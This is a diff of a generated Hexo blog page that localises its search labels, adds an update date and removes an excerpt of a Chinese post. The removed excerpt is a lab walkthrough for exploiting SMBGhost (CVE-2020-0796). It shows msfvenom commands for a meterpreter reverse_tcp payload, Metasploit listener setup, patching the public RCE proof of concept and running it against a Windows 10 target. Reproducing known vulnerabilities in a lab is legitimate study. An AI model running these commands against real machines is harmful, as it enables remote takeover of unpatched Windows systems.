@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"搜索帖子","hits_empty":"我们没有找到任何搜索结果: ${query}","hits_stats":"在 ${time} 毫秒内找到 ${hits} 结果"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="一句话的长度">
@@ -195,10 +195,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-07-11 20:12:57 / 修改时间：20:37:51" itemprop="dateCreated datePublished" datetime="2024-07-11T20:12:57+08:00">2024-07-11</time>
+              <time title="创建时间：2024-07-11 20:12:57" itemprop="dateCreated datePublished" datetime="2024-07-11T20:12:57+08:00">2024-07-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-12 20:40:29" itemprop="dateModified" datetime="2024-07-12T20:40:29+08:00">2024-07-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -225,32 +231,14 @@
 <p>下载<a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br>使用<br><code>pip install ntlm_auth</code></p>
 </blockquote>
 <p> .&#x2F;CVE-2020-0796.py  192.168.30.134</p>
-<p> EXP(RCE)：漏洞利用</p>
-<p>下载<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br> 接下来使用kali作为攻击机</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.223.128  LPORT=5555 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure>
-
-<p> 使用vim</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq!  </span><br></pre></td></tr></table></figure>
-<p> 去文件夹将exploit内容替换到exploit.py</p>
-<p> 参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">python exploit.py -ip 192.168.20.128（靶机ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="一、复现环境"><a href="#一、复现环境" class="headerlink" title="一、复现环境"></a>一、复现环境</h2><p>靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙）<br>下载地址：<a target="_blank" rel="noopener" href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019ip：192.168.1.10<br><img src="/../img/image.webp"><br><img src="/../img/image%201.webp"></p>
-<h2 id="二、检测工具："><a href="#二、检测工具：" class="headerlink" title="二、检测工具："></a>二、检测工具：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1.在靶机里下载检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></p>
-<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>2.运行工具，检测到漏洞风险<br><img src="/../img/image%202.webp"></p>
-<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>POC下载：</p>
-<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><ol>
-<li>在kali中利用MSF生成木马：</li>
-</ol>
-<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit</code></p>
-<p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p>
-<h3 id="2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存"><a href="#2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存" class="headerlink" title="2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存"></a>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</h3><p><img src="/../img/image%203.webp"></p>
-<h3 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3. kali开启监听"></a>3. kali开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-运行exp"><a href="#4-运行exp" class="headerlink" title="4. 运行exp"></a>4. 运行exp</h3><p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="/../img/image%204.webp"><br>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p>
-<h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><p><img src="/../img/image%205.webp"></p>
-<h3 id="6-简易原理图"><a href="#6-简易原理图" class="headerlink" title="6. 简易原理图"></a>6. 简易原理图</h3><p><img src="/../img/Pasted%20image%2020240711201750.png"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
